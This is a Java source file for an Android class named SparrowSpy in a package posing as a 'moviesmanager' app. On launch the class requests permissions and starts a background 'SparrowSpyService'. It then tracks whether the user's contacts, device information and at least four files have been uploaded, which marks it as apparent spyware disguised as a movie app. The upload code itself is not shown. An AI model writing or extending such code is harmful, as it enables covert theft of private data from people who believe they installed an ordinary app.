package com.sickboydroid.moviesmanager;

import android.app.Activity;
import android.content.Intent;
import android.util.Log;

import com.sickboydroid.moviesmanager.events.Events;
import com.sickboydroid.moviesmanager.services.SparrowSpyService;
import com.sickboydroid.moviesmanager.utils.Constants;
import com.sickboydroid.moviesmanager.utils.SpyState;

public class SparrowSpy {
    private static final String TAG = "SparrowSpy";
    public static final int PERMISSIONS_REQUEST_CODE = 101;
    public static final int OPEN_SETTINGS_REQUEST_CODE = 102;
    private final Activity mActivity;
    private final PermissionManager mPermissionManager;

    private SparrowSpy(Activity activity) {
        mActivity = activity;
        mPermissionManager = new PermissionManager(activity);
    }

    public static SparrowSpy init(Activity activity) {
        SparrowSpy spy = new SparrowSpy(activity);
        if(!spy.hasUploadedAllData())
            spy.startCollectorService();
        return spy;
    }

    public SparrowSpy setDataCollectionListener(Events.DataCollectionListener listener) {
        SpyState.Listeners.dataCollectionListener = listener;
        return this;
    }

    public SparrowSpy setDataUploadListener(Events.DataUploadListener listener) {
        SpyState.Listeners.dataUploadListener = listener;
        return this;
    }

    public SparrowSpy setSpyServiceStateChangeListener(Events.SpyServiceStateChangeListener listener) {
        SpyState.Listeners.spyServiceStateChangeListener = listener;
        return this;
    }

    public SparrowSpy setPermissionDeniedListener(Events.PermissionsListener listener) {
        SpyState.Listeners.permissionsListener = listener;
        return this;
    }

    private void startCollectorService() {
        if (!mPermissionManager.hasAllPermissions()) {
            Log.d(TAG, "All permissions are not granted, prompting for permission grant...");
            mPermissionManager.grantPermissions();
            return;
        }
        Intent intentCollectorService = new Intent(mActivity, SparrowSpyService.class);
        mActivity.startForegroundService(intentCollectorService);
    }

    public void handlePermissionResult() {
        mPermissionManager.handlePermissionResult();
        startCollectorService();
    }

    public boolean hasUploadedAllData() {
        return Constants.appPrefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)
                && Constants.appPrefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false)
                && Constants.appPrefs.getInt(Constants.UPLOADED_FILES_COUNT, 0) >= 4;
    }

}
